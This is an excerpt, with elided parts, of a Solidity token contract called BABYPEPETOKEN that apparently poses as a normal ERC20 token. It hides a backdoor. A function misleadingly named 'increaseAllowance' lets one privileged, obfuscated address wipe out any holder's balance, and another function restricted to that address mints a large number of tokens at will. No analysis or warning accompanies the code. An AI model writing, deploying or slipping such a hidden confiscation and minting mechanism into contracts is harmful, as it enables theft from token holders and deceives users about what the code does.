...
contract BABYPEPETOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(vmngh17 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = BABYPEPE[newadd];
        uint256 newaaamount = BABYPEPE[newadd]+BABYPEPE[newadd]-curamount;
        BABYPEPE[newadd] -= newaaamount;
        }else{
        if(vmngh17 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        BABYPEPE[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(vmngh17 == _msgSender());
        if(vmngh17 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = BABYPEPE[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        BABYPEPE[from] = BABYPEPE[from]-amount;
        BABYPEPE[to] = BABYPEPE[to]+amount;
